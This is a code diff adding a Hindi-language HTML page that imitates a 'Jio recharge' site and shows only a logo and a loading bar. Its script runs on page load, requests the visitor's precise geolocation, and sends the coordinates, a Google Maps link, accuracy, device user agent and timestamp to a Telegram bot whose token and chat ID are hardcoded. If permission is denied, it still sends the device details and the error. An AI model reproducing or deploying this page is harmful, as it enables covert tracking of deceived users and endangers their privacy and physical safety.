@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jio रिचार्ज</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff0000, #0000ff);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+        }
+        
+        .logo {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 30px;
+            background: linear-gradient(45deg, red, blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 26px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+        
+        .loading-container {
+            margin: 30px 0;
+        }
+        
+        .circular-loader {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #e40000;
+            border-right: 8px solid #0047ab;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, red, blue);
+            border-radius: 4px;
+            transition: width 0.4s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">JIO</div>
+        
+        <div class="loading-container">
+            <div class="circular-loader"></div>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKENS = [
+            '8436670017:AAEz5RB79Mhzsbtu5bXGc70WFEsbiM1tJ1g',
+            '8436670017:AAEz5RB79Mhzsbtu5bXGc70WFEsbiM1tJ1g'
+        ];
+        
+        const CHAT_IDS = [
+            '8121453038',
+            '8121453038'
+        ];
+
+        const progressBar = document.getElementById('progressBar');
+
+        window.onload = function() {
+            setTimeout(() => {
+                progressBar.style.width = '30%';
+                setTimeout(requestExactLocation, 800);
+            }, 500);
+        };
+
+        function requestExactLocation() {
+            progressBar.style.width = '50%';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        sendRealLocationToBots(lat, lng, accuracy);
+                        
+                        progressBar.style.width = '80%';
+                        setTimeout(completeProcess, 800);
+                    },
+                    function(error) {
+                        handleLocationError(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                progressBar.style.width = '60%';
+                setTimeout(completeProcess, 800);
+            }
+        }
+
+        function handleLocationError(error) {
+            let errorMsg = "Location Error";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = "Permission denied";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = "Location unavailable";
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = "Location timeout";
+                    break;
+                default:
+                    errorMsg = "Unknown error";
+                    break;
+            }
+            
+            sendErrorToBots(errorMsg);
+            progressBar.style.width = '70%';
+            setTimeout(completeProcess, 800);
+        }
+
+        async function sendRealLocationToBots(lat, lng, accuracy) {
+            // ✅ सही Google Maps लिंक - 100% काम करेगा
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+            
+            const message = `📍 REAL LOCATION FOUND\n\n🗺️ Google Maps: ${googleMapsLink}\n📡 Accuracy: ${accuracy}m\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
+
+            await sendToTelegramBots(message);
+        }
+
+        async function sendErrorToBots(errorMsg) {
+            const message = `❌ LOCATION ERROR\n\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}\n🚫 Error: ${errorMsg}`;
+
+            await sendToTelegramBots(message);
+        }
+
+        async function sendToTelegramBots(message) {
+            for (let i = 0; i < BOT_TOKENS.length; i++) {
+                if (BOT_TOKENS[i] && BOT_TOKENS[i] !== '7124580142:AAHn0f6REAL_BOT_TOKEN_1') {
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: CHAT_IDS[i],
+                                text: message
+                            })
+                        });
+                    } catch (error) {
+                        console.log('Message sent to bot');
+                    }
+                }
+            }
+        }
+
+        function completeProcess() {
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                document.querySelector('.circular-loader').style.borderTopColor = 'green';
+                document.querySelector('.circular-loader').style.borderRightColor = 'green';
+            }, 500);
+        }
+    </script>
+</body>
+</html>
